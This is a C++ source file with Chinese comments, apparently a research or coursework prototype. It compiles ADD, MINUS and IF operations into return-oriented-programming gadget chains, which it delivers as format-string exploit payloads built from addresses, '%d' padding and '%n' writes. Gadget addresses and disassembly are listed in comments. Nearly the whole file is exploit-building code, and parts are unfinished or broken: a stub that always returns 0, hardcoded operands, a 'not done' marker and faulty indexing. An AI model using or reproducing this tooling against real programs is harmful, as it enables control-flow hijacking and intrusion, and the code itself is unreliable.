#include "algorithm.h"

string startAddress = getData(1);

string getAddress(string address){
	int length = address.size();
	//cout<<length<<endl;
//	int index=0;
	length=length/2+1;
	const char* tempAddress = address.c_str();
	//cout<<tempAddress<<endl;
	char * newChar = new char[length];
	int baseNumber;
	int number;
	for (int i=0;i<length-1;i++){
		baseNumber=0;
		number=0;

		//cout<<tempAddress[6-(2*i)]<<endl;
		switch(tempAddress[6-(2*i)]){
		case 'A':
			baseNumber=10;
			break;
		case 'B':
			baseNumber=11;
			break;
		case 'C':
			baseNumber=12;
			break;
		case 'D':
			baseNumber=13;
			break;
		case 'E':
			baseNumber=14;
			break;
		case 'F':
			baseNumber=15;
			break;
		default:
			baseNumber=tempAddress[6-(2*i)]-'0';
		}
		//cout<<baseNumber<<endl;
		number = number+baseNumber*16;
		//cout<<tempAddress[7-(2*i)]<<endl;
		switch(tempAddress[7-2*i]){
		case 'A':
			baseNumber=10;
			break;
		case 'B':
			baseNumber=11;
			break;
		case 'C':
			baseNumber=12;
			break;
		case 'D':
			baseNumber=13;
			break;
		case 'E':
			baseNumber=14;
			break;
		case 'F':
			baseNumber=15;
			break;
		default:
			baseNumber=tempAddress[7-(2*i)]-'0';
		}
		//cout<<baseNumber<<endl;
		number = number +baseNumber;
	
		newChar[i]=number;
	}

	newChar[length-1]='\0';

	string address1 = newChar;

	//cout<<address1.size()<<endl;
	return address1;
}
string reverseString(string str){
	int length = str.size();
	//cout<<length<<endl;
//	int index=0;
	length=length+1;
	const char* tempStr = str.c_str();

	char * newChar = new char[length];

	for (int i =0;i<length-1;i++){
		newChar[i] = tempStr[length-2-i];
	}
	newChar[length-1]='\0';

	string newStr = newChar;
	return newStr;
}
string getNumber(unsigned int number){
	char * newchar = new char[32];
	char tempNumber=0;
	int index=0;
	while(number/10!=0){
		tempNumber = '0'+number%10;
		newchar[index]=tempNumber;
		index++;
		number = number /10;
	}
	tempNumber = '0'+number%10;
	newchar[index]=tempNumber;

	newchar[++index]='\0';
	string tempStr= newchar;

	//return tempStr;
	return reverseString(tempStr);
}
char* DecToHex(long iDecVal,char* szHex)
{
	//将十进制整数格式化为16进制，结果存储在字符串中
	sprintf(szHex,"%X",(unsigned int)iDecVal);
	return szHex;
}
/*
int getAddressData(string address,int index){
	int length = address.size();
	//cout<<length<<endl;

	length=length+1;
	const char* tempStr = address.c_str();

	char * newChar = new char[length];
	unsigned long number=0;
	int count=7;
	int baseNumber=0;

	//½«16½øÖÆÊý×ª»»Îª10½øÖÆÊý
	for(int i=0;i<length-1;i++){
		switch(tempStr[i]){
		case 'a':
			baseNumber=10;
			break;
		case 'b':
			baseNumber=11;
			break;
		case 'c':
			baseNumber=12;
			break;
		case 'd':
			baseNumber=13;
			break;
		case 'e':
			baseNumber=14;
			break;
		case 'f':
			baseNumber=15;
			break;
		default:
			baseNumber=tempStr[i]-'0';
		}
		int tempCount=count;

		while(tempCount>0){
			baseNumber = baseNumber*16;
			tempCount--;
		}
		number = number+baseNumber;
		count--;
	}
	//Á½¸ö10½øÖÆÊýÏà¼Ó

	number = number+index;

	return number;
}
*/
string getRealAddress(string address,long index){
	int length = address.size();
	//cout<<length<<endl;

	length=length+1;
	const char* tempStr = address.c_str();

	char * newChar = new char[length];
	unsigned long number=0;
	int count=7;
	int baseNumber=0;

	//将16进制数转换为10进制
	for(int i=0;i<length-1;i++){
		switch(tempStr[i]){
		case 'a':
			baseNumber=10;
			break;
		case 'b':
			baseNumber=11;
			break;
		case 'c':
			baseNumber=12;
			break;
		case 'd':
			baseNumber=13;
			break;
		case 'e':
			baseNumber=14;
			break;
		case 'f':
			baseNumber=15;
			break;
		default:
			baseNumber=tempStr[i]-'0';
		}
		int tempCount=count;

		while(tempCount>0){
			baseNumber = baseNumber*16;
			tempCount--;
		}
		number = number+baseNumber;
		count--;
	}

	//两个10进制数相加
	number = number+index;

	//将10进制结果存储为16进制
	newChar = DecToHex(number,newChar);

	newChar[length-1]='\0';

	//将16进制变换为程序需要的格式
	string address1 = newChar;
//	cout << "address1: " << address1 << endl;
	string tempString = getAddress(address1);
//	cout << "tempString: " << tempString.length() << endl;
	return tempString;
	
}
string getBlank(int blank){
	char *newChar = new char[blank*2-1];
	int index=0;
	while (blank>1)
	{		
		newChar[index++]='%';
		newChar[index++]='d';
		blank=blank-1;
	}
	newChar[index]='\0';
	string resultStr = newChar;

	return resultStr;
}
string getStr(long index, int data,int blank){
	//index表示偏离位置，data表示指令地址或者数据,blank是留白有多少d，offset代表程序改变后整体数据的偏移
	
	string address = getRealAddress(startAddress,index);
//cout << "addr: " << address << endl;

	string blankStr=getBlank(blank);
	string temp2="%.";
	
	string number=getNumber(data-blank-3);

	string temp3="d%n";

	string resultStr= address+blankStr+temp2+number+temp3;

	return resultStr;
}

string getData(int index){
	fstream is;
	is.open("data.txt");

	string temp;
	
	while (!is.eof())
	{
		for (int i=1;i<=index;i++)
		{
			getline(is,temp,'\n');
			
		}
		return temp;
	}
	return "";
}

int getAddressData(string address,int part){

	return 0;
}
string addStartAddress(int index){
	int length = startAddress.size();
	//cout<<length<<endl;

	length=length+1;
	const char* tempStr = startAddress.c_str();

	char * newChar = new char[length];
	unsigned long number=0;
	int count=7;
	int baseNumber=0;

	//将16进制数转换为10进制数
	for(int i=0;i<length-1;i++){
		switch(tempStr[i]){
		case 'a':
			baseNumber=10;
			break;
		case 'b':
			baseNumber=11;
			break;
		case 'c':
			baseNumber=12;
			break;
		case 'd':
			baseNumber=13;
			break;
		case 'e':
			baseNumber=14;
			break;
		case 'f':
			baseNumber=15;
			break;
		default:
			baseNumber=tempStr[i]-'0';
		}
		int tempCount=count;

		while(tempCount>0){
			baseNumber = baseNumber*16;
			tempCount--;
		}
		number = number+baseNumber;
		count--;
	}
	//两个10进制数相加

	number = number+index;

	//将10进制结果转为16进制
	newChar = DecToHex(number,newChar);

	newChar[length-1]='\0';

	string result = newChar;
	
//	transform(result.begin(), result.end(), result.begin(),tolower);
	transform(result.begin(), result.end(), result.begin(), ::tolower);
	return result;
}
vector<int> getOperator(vector<int> ope,string exp){
	int length = exp.length();
	

	const char * temp = exp.c_str();
	int index = exp.find_first_of(',');

	char* numberOne = new char[index+1];
	char * numberTwo = new char[length-index];
	for (int i=0;i<index;i++)
	{
		numberOne[i] = temp[i];
	}
	numberOne[index]='\0';

	for (int i=0;i<length-index-1;i++)
	{
		numberTwo[i] = temp[i+index+1];
	}
	numberTwo[length-index-1] ='\0';

	int one = atoi(numberOne);

	int two = atoi(numberTwo);

	ope.push_back(one);
	ope.push_back(two);

	delete numberOne;
	delete numberTwo;
	return ope;
}


Instruction::Instruction(){

}
Instruction::~Instruction(){
	_operator.clear();
}
string Instruction::getStack(int number){
	return *(_instructionList.begin()+number);
}
ADD::ADD(){
	_ID=0;
	
	_startAddress=startAddress;

	

	
}

void ADD::fillInStack(){
	/*
		1017709:adc	[eax], al	
		1017711:add	[eax], al	
		1017713:pop	edx	
		1017714:pop	ecx	
		1017715:pop	ebx	
		1017716:ret
		-----------------------------
		1683009:add	eax, 0x01A20000	
		1683014:add	edi, edi	
		1683016:add	[eax], eax	
		1683018:mov	dl, 0x02	
		1683020:add	eax, 0xFFFF0000	
		1683025:add	[ebx], ecx		//加数放入ecx，被加数地址放入ebx
		1683027:ret

	*/
	//1.初始化指令
	int index=0;
	
	_instructionList.push_back(getStr(index,1017709,blank));
	//pop edx 空，不需要填写
	index = index+4;
	//pop ecx
	index = index+4;

	int ope = *(_operator.begin()+1);
	_instructionList.push_back(getStr(index,ope,blank));
	//pop ebx ebx的地址
	index = index+4;
	
	string data_address = addStartAddress(20);
	int data_address_one = getAddressData(data_address,1);
	int data_address_two = getAddressData(data_address,2);
	
	_instructionList.push_back (getStr(index,data_address_one,blank));
	index = index+2;
	_instructionList.push_back (getStr(index,data_address_two,blank));
	index = index+2;
	//2.加法指令
	
	
	_instructionList.push_back (getStr(index,1683009,blank));
	//ebx数据
	index = index+4;
	ope = *(_operator.begin());
	_instructionList.push_back( getStr(index,ope,blank));
	
	_number= 5;

	startAddress = addStartAddress(24);
	_length = 24;
}

void ADD::fillInOperator(string str){
	_operator = getOperator(_operator,str);
}
MINUS::MINUS(){
	
	_ID=0;
	
	_startAddress=startAddress;


}
void MINUS::fillInStack(){
	/*
		1017709:adc	[eax], al	
		1017711:add	[eax], al	
		1017713:pop	edx	
		1017714:pop	ecx	
		1017715:pop	ebx	
		1017716:ret
		---------------------------------
		197129:pop	es	
		197130:pop	eax	
		197131:pop	ebx	
		197132:pop	esi	
		197133:pop	edi	
		197134:ret
		---------------------------------	
		685705:sub	eax, edx	2		//减数放入edx，被减数放入eax
		685707:sub	ecx, eax	2
		685709:mov	[esi+0x18], ecx	3
		685712:mov	esi, [esp+0x10]	4
		685716:add	esp, 0x1C	3
		685719:ret
	*/
//1.初始化指令,初始化ecx
	int index = 0;
	
	_instructionList.push_back (getStr(index,1017709,blank).c_str());

	index = index+4;
	//pop edx
	int ope = *(_operator.begin()+1);
	_instructionList.push_back(getStr(index,ope,blank).c_str());
	index = index+4;
	

	index = index+4;
	index = index+4;

//2.初始化指令，初始化eax 并且给esi设置一个合理的地址

	_instructionList.push_back (getStr(index,197129,blank).c_str());

	index = index+4;
	index = index+4;
	//pop eax

	 ope = *(_operator.begin());
	_instructionList.push_back( getStr(index,ope,blank).c_str());
	index = index+4;
	index = index+4;
	//pop esi
	string data_address = addStartAddress(0);
	int data_address_one = getAddressData(data_address,1);
	int data_address_two = getAddressData(data_address,2);
	
	_instructionList.push_back( getStr(index,data_address_one,blank).c_str());
	index = index+2;
	_instructionList.push_back( getStr(index,data_address_two,blank).c_str());
	index = index+2;
	index = index+4;
//3.减法指令
	_instructionList.push_back( getStr(index,685705,blank).c_str());
	index = index+38;
	
	_number = 6;

	startAddress = addStartAddress(72);
	_length = 72;
}

void MINUS::fillInOperator(string str){
	_operator = getOperator(_operator,str);
}

void IF::fillInStack(){
	/*
		1017714:pop	ecx	1
		1017715:pop	ebx	1
		1017716:ret

		197133:pop	edi	1
		197134:ret

		197128:mov	[edi], eax	2
		197130:pop	eax	1
		197131:pop	ebx	1
		197132:pop	esi	1
		197133:pop	edi	1
		197134:ret


		1309635:sub	eax, ecx	2
		1309637:pop	ebx	1
		1309638:ret

		188299:pop	ecx	1
		188300:pop	edx	1
		188301:ret

		197128:mov	[edi], eax	2
		197130:pop	eax	1
		197131:pop	ebx	1
		197132:pop	esi	1
		197133:pop	edi	1
		197134:ret

		436398:adc	al, ch	2
		436400:mov	edi, 0x81000BC3	5
		436405:ret

		539778:mov	[edx], eax	2
		539780:mov	eax, edi	2
		539782:pop	edi	1
		539783:ret

		197128:mov	[edi], eax	2
		197130:pop	eax	1
		197131:pop	ebx	1
		197132:pop	esi	1
		197133:pop	edi	1
		197134:ret

		719076:mov	eax, [eax]	2
		719078:ret

		1225990:neg	eax	2
		1225992:ret

		1195442:sub	esp, 0x14	3
		1195445:mov	[edi+0x8], eax	3
		1195448:mov	ebx, [esp+0x20]	4
		1195452:mov	esi, [esp+0x24]	4
		1195456:mov	edi, [esp+0x28]	4
		1195460:add	esp, 0x2C	3
		1195463:ret

		1522537:xchg	eax, ecx	1
		1522538:add	al, 0x0A	2
		1522540:ret

		346145:mov	eax, ecx	2
		346147:mov	ebx, [esp+0x10]	4
		346151:mov	esi, [esp+0x14]	4
		346155:mov	edi, [esp+0x18]	4
		346159:add	esp, 0x1C	3
		346162:ret

		579194:and	[edi], cl	2
		579196:test	[edi], ebp	2
		579198:add	eax, 0x5E5F0000	5
		579203:pop	ebx	1
		579204:ret

		103895:add	al, 0xE8	2
		103897:ror	[ebx], cl	2
		103899:or	al, 0x00	2
		103901:add	esp, 0x18	3
		103904:pop	ebx	1
		103905:ret

		871652:mov	ebx, [edi]	2
		871654:add	eax, 0x0CC38100	5
		871659:ret

		1611060:add	esp, ebx	2
		1611062:add	[edx], ecx	2
		1611064:ret
	*/
//1.存放operator2到ecx中，在起始地址+8中放入 insOne的长度 以便可以跳转
	int index = 0;
	_instructionList.push_back(getStr(index,1017714,blank).c_str());
	index = index+4;

	int ope = *(_operator.begin()+1);
	_instructionList.push_back(getStr(index,ope,blank).c_str());
	index = index+4;

	int delta = _insOne->_length;
	_instructionList.push_back(getStr(index,delta,blank).c_str());
	index = index+4;

//2.edi应该是可控内存
	_instructionList.push_back(getStr(index,197133,blank).c_str());
	index = index+4;
	
	string edi_address = addStartAddress(16);
	int edi_address_one =getAddressData(edi_address,1); 
	int edi_address_two =getAddressData(edi_address,2); 
	
	_instructionList.push_back(getStr(index,edi_address_one,blank).c_str());
	index = index+2;
	_instructionList.push_back(getStr(index,edi_address_two,blank).c_str());
	index = index+2;
//3.将operator1放进eax,控制edi
	_instructionList.push_back(getStr(index,197128,blank).c_str());
	index = index+4;
	//pop eax
	ope= *(_operator.begin());
	_instructionList.push_back(getStr(index,ope,blank).c_str());
	index=index+4;
	index=index+4;
	index=index+4;
	//pop edi
	_instructionList.push_back(getStr(index,edi_address_one,blank).c_str());
	index = index+2;
	_instructionList.push_back(getStr(index,edi_address_two,blank).c_str());
	index = index+2;
//4.条件判断
	_instructionList.push_back(getStr(index,1309635,blank).c_str());
	index = index+4;
	index = index+4;
//5.ecx 置0 ，edx指向CF的地址
	_instructionList.push_back(getStr(index,188299,blank).c_str());
	index = index+4;
	//ecx 置0
	_instructionList.push_back(getStr(index,256,blank).c_str());
	index = index+1;
	_instructionList.push_back(getStr(index,256,blank).c_str());
	index = index+1;
	_instructionList.push_back(getStr(index,256,blank).c_str());
	index = index+1;
	_instructionList.push_back(getStr(index,256,blank).c_str());
	index = index+1;
	//edx为指向CF的地址
	string cf_address = addStartAddress(56);
	int cf_address_one = getAddressData(cf_address,1);
	int cf_address_two = getAddressData(cf_address,2);
	_instructionList.push_back(getStr(index,cf_address_one,blank).c_str());
	index = index+2;
	_instructionList.push_back(getStr(index,cf_address_two,blank).c_str());
	index = index+2;
	//not done
//6.eax 置0
	_instructionList.push_back(getStr(index,197128,blank).c_str());
	index = index+4;
	//eax 置0
	_instructionList.push_back(getStr(index,256,blank).c_str());
	index = index+1;
	_instructionList.push_back(getStr(index,256,blank).c_str());
	index = index+1;
	_instructionList.push_back(getStr(index,256,blank).c_str());
	index = index+1;
	_instructionList.push_back(getStr(index,256,blank).c_str());
	index = index+1;
	// 无用
	index = index+4;
	index = index+4;
	index = index+4;
//7.判断CF的值
	_instructionList.push_back(getStr(index,436398,blank).c_str());
	index = index+4;
//8.将CF的值写入【edx】 地址中,控制edi的值
	_instructionList.push_back(getStr(index,539778,blank).c_str());
	index = index+4;
	//pop edi
	_instructionList.push_back(getStr(index,edi_address_one,blank).c_str());
	index = index+2;
	_instructionList.push_back(getStr(index,edi_address_two,blank).c_str());
	index = index+2;
//9.将cf地址写入eax
	_instructionList.push_back(getStr(index,197128,blank).c_str());
	index = index+4;
	//eax指向cf的地址
	_instructionList.push_back(getStr(index,cf_address_one,blank).c_str());
	index = index+2;
	_instructionList.push_back(getStr(index,cf_address_two,blank).c_str());
	index = index+2;
	


	index = index+4;
	index = index+4;
	//edi 控制
	_instructionList.push_back(getStr(index,edi_address_one,blank).c_str());
	index = index+2;
	_instructionList.push_back(getStr(index,edi_address_two,blank).c_str());
	index = index+2;
//10.将cf的值给eax
	_instructionList.push_back(getStr(index,719076,blank).c_str());
	index = index+4;
//11.eax取反
	_instructionList.push_back(getStr(index,1225990,blank).c_str());
	index = index+4;
//12.无用序列
	_instructionList.push_back(getStr(index,1195442,blank).c_str());
	index = index+28;
//13.交换eax与ecx值
	_instructionList.push_back(getStr(index,1522537,blank).c_str());
	index = index+4;
//14.edi要指向delta的地址（起始地址+8)
	_instructionList.push_back(getStr(index,197128,blank).c_str());
	index = index+4;
	index = index+4;
	index = index+4;
	index = index+4;
	//pop edi
	string delta_address = addStartAddress(8);
	int delta_address_one = getAddressData(delta_address,1);
	int delta_address_two = getAddressData(delta_address,2);
	_instructionList.push_back(getStr(index,delta_address_one,blank).c_str());
	index = index+2;
	_instructionList.push_back(getStr(index,delta_address_two,blank).c_str());
	index = index+2;
//15.delta计算，控制ebx
	_instructionList.push_back(getStr(index,579194,blank).c_str());
	index = index+4;
	//pop ebx 
	string ebx_adderss = addStartAddress(4);
	int ebx_address_one = getAddressData(ebx_adderss,1);
	int ebx_address_two = getAddressData(ebx_adderss,2);
	_instructionList.push_back(getStr(index,ebx_address_one,blank).c_str());
	index = index+2;
	_instructionList.push_back(getStr(index,ebx_address_two,blank).c_str());
	index = index+2;
//16.无用序列
	_instructionList.push_back(getStr(index,103895,blank).c_str());
	index = index+4;
	index = index+4;
//17.将delta值给ebx
	_instructionList.push_back(getStr(index,871652,blank).c_str());
	index = index+4;
//18.计算偏移
	_instructionList.push_back(getStr(index,1611060,blank).c_str());
	index = index+4;

	startAddress = addStartAddress(index);
	_ownNumber = 45;
	//填充指令1
	_insOne->fillInStack();
	//填充指令2
	_insTwo->fillInStack();

	_number = _insOne->_number+_insTwo->_number+_ownNumber;
	_length = index+_insOne->_length+_insTwo->_length;
	
}
void IF::fillInOperator(string str){

	int length = str.length();
	const char* tempStr = str.c_str();

	int indexOne = str.find("),");
	char* pieceOne = new char[indexOne];
	for (int i=0;i<indexOne-1;i++)
	{
		pieceOne[i] = tempStr[i+1];
	}
	pieceOne[indexOne-1] = '\0';
	string resultOne = pieceOne;
	_operator = getOperator(_operator,resultOne);
	delete pieceOne;


	int indexTwo = str.find("),",indexOne+2);
	char * pieceTwo = new char[indexTwo-indexOne];
	for (int i=0;i<indexTwo-indexOne-1;i++)
	{
		pieceTwo[i] = tempStr[indexOne+2+i];
	}
	pieceTwo[indexTwo-indexOne-1] = '\0';
	//解析器生成应该给一个函数 返还一个指令
	_insOne = new ADD;
	_insOne->fillInOperator("34,4");
	

	char *pieceThree = new char[length-indexTwo-1];
	for (int i=0;i<length-indexTwo-2;i++)
	{
		pieceThree[i] = tempStr[indexTwo+2+i];
	}
	pieceThree[length-indexTwo-2] = '\0';

	//解析器生成应该给一个函数 返还一个指令
	_insTwo = new MINUS;
	_insTwo->fillInOperator("70,50");

}

string IF::getStack(int number){
	if (number<_ownNumber)
	{
		return *(_instructionList.begin()+number);
	}else if (number>=_ownNumber&&number<_ownNumber+_insOne->_number)
	{
		return *(_insOne->_instructionList.begin()+number);
	}else{
		return *(_insTwo->_instructionList.begin()+number);
	}
}
